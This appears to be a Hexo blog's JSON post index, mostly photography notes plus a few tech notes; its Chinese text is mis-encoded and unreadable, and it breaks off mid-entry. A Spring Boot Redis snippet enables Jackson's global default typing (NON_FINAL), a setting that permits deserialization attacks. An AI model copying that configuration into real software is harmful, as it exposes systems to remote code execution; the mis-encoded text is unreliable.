‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"æ»¤é•œ","slug":"history/shoot/5a7acc4ef5087a54058a83cc","date":"2018-02-06T21:52:14.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a7acc4ef5087a54058a83cc/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a7acc4ef5087a54058a83cc/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"è‰²å½©","slug":"history/shoot/5a7acc0ef5087a54058a83cb","date":"2018-02-06T21:51:10.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a7acc0ef5087a54058a83cb/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a7acc0ef5087a54058a83cb/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"åæ­¥æ‘„å½±æ³•","slug":"history/shoot/5a7acb8df5087a54058a83ca","date":"2018-02-06T21:49:01.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a7acb8df5087a54058a83ca/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a7acb8df5087a54058a83ca/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"spring boot data redis","slug":"history/tech/5a792d97f5087a54058a83c7","date":"2018-02-06T04:22:47.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a792d97f5087a54058a83c7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a792d97f5087a54058a83c7/","excerpt":"","text":"com.fasterxml.jackson.databind.JsonMappingException: failed to lazily initialize a collection of role: com.ln.baseframe.security.entity.Module.modules, could not initialize proxy - no Sessionå¼‚å¸¸åœºæ™¯ï¼šä½¿ç”¨æ³¨è§£ç¼“å­˜ æŸ¥è¯¢çš„å¯¹è±¡ æœ‰å…³è”æŸ¥è¯¢ï¼Œé›†åˆä¸ºç©ºï¼Œæ·»åŠ Redisçš„æ—¶å€™æŠ¥é”™ã€‚ã€‚è§£å†³åŠæ³•ï¼šcacha configåŠ å…¥ä¾èµ–&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt; &lt;artifactId&gt;jackson-datatype-hibernate4&lt;/artifactId&gt; &lt;version&gt;2.3.2&lt;/version&gt; &lt;/dependency&gt; @Bean public RedisTemplate&lt;String, String&gt; redisTemplate( RedisConnectionFactory factory) { StringRedisTemplate template = new StringRedisTemplate(factory); Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class); ObjectMapper om = new ObjectMapper(); om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY); om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); om.registerModule(new Hibernate4Module()); jackson2JsonRedisSerializer.setObjectMapper(om); template.setValueSerializer(jackson2JsonRedisSerializer); template.afterPropertiesSet(); return template; }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"},{"name":"springboot","slug":"springboot","permalink":"https://wangxiuwen.github.io/tags/springboot/"}],"author":"baipeng"},{"title":"é—ªå…‰","slug":"history/shoot/5a797d41f5087a54058a83c9","date":"2018-02-05T22:02:41.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a797d41f5087a54058a83c9/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a797d41f5087a54058a83c9/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"æ„å›¾","slug":"history/shoot/5a797c60f5087a54058a83c8","date":"2018-02-05T21:58:56.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a797c60f5087a54058a83c8/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a797c60f5087a54058a83c8/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/shoot/5a72bec3f5087a54058a83c6","date":"2018-01-31T19:16:19.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a72bec3f5087a54058a83c6/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a72bec3f5087a54058a83c6/","excerpt":"","text":"å…¶å®ƒäººåƒé•œå¤´ å®šç„¦é•œå¤´ è¯¯åŒº: å‡†å¾®è·","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72beb2f5087a54058a83c5","date":"2018-01-31T19:16:02.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72beb2f5087a54058a83c5/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72beb2f5087a54058a83c5/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72bea3f5087a54058a83c4","date":"2018-01-31T19:15:47.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72bea3f5087a54058a83c4/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72bea3f5087a54058a83c4/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72bde9f5087a54058a83c3","date":"2018-01-31T19:12:41.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72bde9f5087a54058a83c3/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72bde9f5087a54058a83c3/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72bdd5f5087a54058a83c2","date":"2018-01-31T19:12:21.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72bdd5f5087a54058a83c2/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72bdd5f5087a54058a83c2/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72bd6ef5087a54058a83c1","date":"2018-01-31T19:10:38.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72bd6ef5087a54058a83c1/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72bd6ef5087a54058a83c1/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72bd07f5087a54058a83c0","date":"2018-01-31T19:08:55.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72bd07f5087a54058a83c0/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72bd07f5087a54058a83c0/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72bca6f5087a54058a83bf","date":"2018-01-31T19:07:18.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72bca6f5087a54058a83bf/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72bca6f5087a54058a83bf/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72bc4af5087a54058a83be","date":"2018-01-31T19:05:46.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72bc4af5087a54058a83be/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72bc4af5087a54058a83be/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72bb9df5087a54058a83bd","date":"2018-01-31T19:02:53.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72bb9df5087a54058a83bd/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72bb9df5087a54058a83bd/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72bb10f5087a54058a83bc","date":"2018-01-31T19:00:32.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72bb10f5087a54058a83bc/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72bb10f5087a54058a83bc/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72ba40f5087a54058a83bb","date":"2018-01-31T18:57:04.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72ba40f5087a54058a83bb/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72ba40f5087a54058a83bb/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"é•œå¤´","slug":"history/ui/5a72b970f5087a54058a83ba","date":"2018-01-31T18:53:36.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a72b970f5087a54058a83ba/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a72b970f5087a54058a83ba/","excerpt":"","text":"","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"æ‘„å½±è¥é”€","slug":"history/shoot/5a714963f5087a54058a83b9","date":"2018-01-31T04:43:15.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a714963f5087a54058a83b9/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a714963f5087a54058a83b9/","excerpt":"","text":"vi è§†è§‰è¯†åˆ«logo æ ‡å‡†è‰² äº§å“åŒ…è£… å°åˆ·å“ åç‰‡ æ‰‹æè¢‹ å£å· å…¶å®ƒè‡ªåª’ä½“è¥é”€ äº‹ä»¶è¥é”€ æ‘„å½±å±• ä¸¾åŠæ´»åŠ¨ è‡ªæˆ‘è¥é”€ ç¾¤å±• æ¯”èµ› äº¤æµæ´»åŠ¨ ä¸ªäººç½‘ç«™ å®¢æˆ· åŒè¡Œ åª’ä½“ å‚å•† å‚åŠ å‘å¸ƒä¼š å‚åŠ ä¿±ä¹éƒ¨æ´»åŠ¨ å…¬å…³/å¹¿å‘Šå…¬å¸ æ³¨å†Œå•†æ ‡http://www.saic.gov.cn/å›¾å½¢å•†æ ‡ æ–‡å­—å•†æ ‡ æˆæœ¬æ§åˆ¶äººåŠ›æˆæœ¬ å‘˜å·¥å·¥èµ„ ç¤¾ä¿å…¬ç§¯é‡‘ å‘˜å·¥ç¦åˆ© è¿è¥æˆæœ¬ æˆ¿ç§Ÿ æ°´ç”µ äº¤é€šè¿è¾“ äº§å“åˆ¶ä½œæˆæœ¬ é€šè®¯è´¹ å›ºå®šèµ„äº§é‡‡è´­åŠæ›´æ–° è¥é”€æˆæœ¬ æ´»åŠ¨æˆæœ¬ å¹¿å‘ŠæŠ•æ”¾é¢„ç®—æ§åˆ¶ å¹³å°åˆä½œåˆ†æˆ","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"è¶…çº§æ™¯æ·±å¯¹ç„¦è·ç¦»(è¶…ç„¦è·)","slug":"history/shoot/5a714892f5087a54058a83b8","date":"2018-01-31T04:39:46.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a714892f5087a54058a83b8/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a714892f5087a54058a83b8/","excerpt":"","text":"è¶…çº§çš„ å¯¹ç„¦çš„ è·ç¦» (Hyperfocal distance)","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"ç„¦è·","slug":"history/shoot/5a713bbef5087a54058a83b7","date":"2018-01-31T03:45:02.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a713bbef5087a54058a83b7/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a713bbef5087a54058a83b7/","excerpt":"","text":"ä»€ä¹ˆæ˜¯ç„¦è· ç­‰æ•ˆç„¦è· å®šç„¦å¤´çš„ä¼˜åŠ¿","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"ç”¨æˆ·ç”»åƒ/æœåŠ¡éœ€æ±‚","slug":"history/shoot/5a70575df5087a54058a83b6","date":"2018-01-29T23:30:37.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a70575df5087a54058a83b6/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a70575df5087a54058a83b6/","excerpt":"","text":"ç”¨æˆ·ç”»åƒæ€§åˆ« å¹´é¾„ èŒä¸š æ”¶å…¥ å­¦å† å®¡ç¾å±‚æ¬¡ æ€§æ ¼ç‰¹å¾ å…´è¶£çˆ±å¥½ ç”Ÿæ´»ä¹ æƒ¯ æœåŠ¡éœ€æ±‚ä¸Šé—¨æœåŠ¡ åŒ–å¦†é€ å‹ æœè£…å®šåˆ¶ æ—…è¡Œç­–åˆ’","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"ä»¥å›¾æœå›¾/å›¾ç‰‡ç‰ˆæƒ","slug":"history/shoot/5a7047f8f5087a54058a83b5","date":"2018-01-29T22:24:56.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a7047f8f5087a54058a83b5/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a7047f8f5087a54058a83b5/","excerpt":"","text":"https://www.tineye.com/https://creativecommons.org/licenses/by-nc-sa/3.0/cn/","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"æ™¯æ·±","slug":"history/shoot/5a703353f5087a54058a83b4","date":"2018-01-29T20:56:51.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a703353f5087a54058a83b4/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a703353f5087a54058a83b4/","excerpt":"","text":"å‰åæ™¯æ·±å·®å¼‚å‰æ™¯æ·±æ°¸è¿œå°äºåæ™¯æ·±å…‰åœˆçš„å½±å“ï¼š å…‰åœˆå¤§ï¼Œå·®å¼‚å° å…‰åœˆå°ï¼Œå·®å¼‚å¤§ ç„¦è·çš„å½±å“: ç„¦è·è¶Šé•¿ï¼Œå·®å¼‚è¶Šå° å¯¹ç„¦è·ç¦»çš„å½±å“: å¯¹ç„¦è·ç¦»è¶Šè¿‘ï¼Œå·®å¼‚è¶Šå° å¯¹ç„¦è·ç¦»è¶Šè¿œï¼Œå·®å¼‚è¶Šå¤§ è™šåŒ–æ˜æ˜¾ç¨‹åº¦èƒŒæ™¯/å‰æ™¯ è·ç¦»å¯¹ç„¦ç›®æ ‡è¶Šè¿œï¼Œè™šåŒ–è¶Šæ˜æ˜¾","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"ç„¦å¤–è™šåŒ–","slug":"history/shoot/5a701dd5f5087a54058a83b3","date":"2018-01-29T19:25:09.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a701dd5f5087a54058a83b3/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a701dd5f5087a54058a83b3/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"æµè§ˆå™¨å…¼å®¹æ€§æµ‹è¯•","slug":"history/tech/5a6e9a69f5087a54058a83b1","date":"2018-01-29T03:52:09.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a6e9a69f5087a54058a83b1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a6e9a69f5087a54058a83b1/","excerpt":"","text":"http://kangax.github.io/compat-table/es5/https://www.browserling.com/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ‘„å½±å¸¸è§å‚æ•°","slug":"history/shoot/5a6e9942f5087a54058a83b0","date":"2018-01-29T03:47:14.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a6e9942f5087a54058a83b0/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a6e9942f5087a54058a83b0/","excerpt":"","text":"æ‹æ‘„æœˆçƒ æ‹æ‘„æ˜Ÿæ˜Ÿ","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"é˜³å…‰16æ³•åˆ™","slug":"history/shoot/5a6e91b9f5087a54058a83af","date":"2018-01-29T03:15:05.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a6e91b9f5087a54058a83af/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a6e91b9f5087a54058a83af/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"æ›å…‰","slug":"history/shoot/5a6eb6c4f5087a54058a83b2","date":"2018-01-28T17:53:08.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a6eb6c4f5087a54058a83b2/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a6eb6c4f5087a54058a83b2/","excerpt":"","text":"å…è®¸ 5% å·¦å³çš„æ›å…‰ä¸è¶³ï¼Œå’Œ 2% å·¦å³çš„æ›å…‰è¿‡åº¦æ›å…‰è¡¥å¿å£è¯€:ç™½åŠ é»‘å‡ æ›å…‰è¡¥å¿å–å†³äºè¿‡äº®æˆ–è¿‡æš—çš„ç‰©ä½“æ‰€å é¢ç§¯æ¯”é‡ æ›å…‰åº¦ æ­£ç‰‡æ²¡å…‰çš„åœ°æ–¹å¤åŒ–é“¶å †ç§¯çš„è¶Šé«˜ï¼Œæ‰€ä»¥ å®æ¬ å‹¿è¿‡ åŒ…å›´æ›å…‰","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"æ‘„å½±å¯¹ç„¦/å…‰åœˆ/å¿«é—¨/ISO","slug":"history/shoot/5a698460f5087a54058a83ae","date":"2018-01-24T19:16:48.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/shoot/5a698460f5087a54058a83ae/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a698460f5087a54058a83ae/","excerpt":"","text":"å¯¹ç„¦ å…‰åœˆç„¦è·/å‘¨é•¿ = å…‰åœˆ 50mm Ã· 25 mm = 2 å°±æ˜¯ f/2 çš„å…‰åœˆ å¿«é—¨æ‹‰çš„è¶Šè¿‘ï¼ŒæŠ–åŠ¨è¶Šæ˜æ˜¾ï¼Œéœ€è¦æ›´é«˜çš„å¿«é—¨é€Ÿåº¦ æ„Ÿå…‰åº¦","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"window.WebGLRenderingContext å’Œ canvas.getContext('experimental-webgl') çš„åŒºåˆ«","slug":"history/tech/5a5c6a1ff5087a54058a83ad","date":"2018-01-14T20:45:19.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a5c6a1ff5087a54058a83ad/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a5c6a1ff5087a54058a83ad/","excerpt":"","text":"123var c = document.createElement(&quot;canvas&quot;);var gl = c.getContext(&quot;experimental-webgl&quot;)gl instanceof WebGLRenderingContext","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"nginx ä¸¢å¤±ä¸‹åˆ’çº¿è¯·æ±‚å¤´","slug":"history/tech/5a58905cf5087a54058a83ac","date":"2018-01-11T22:39:24.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a58905cf5087a54058a83ac/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a58905cf5087a54058a83ac/","excerpt":"","text":"1234http &#123; ... 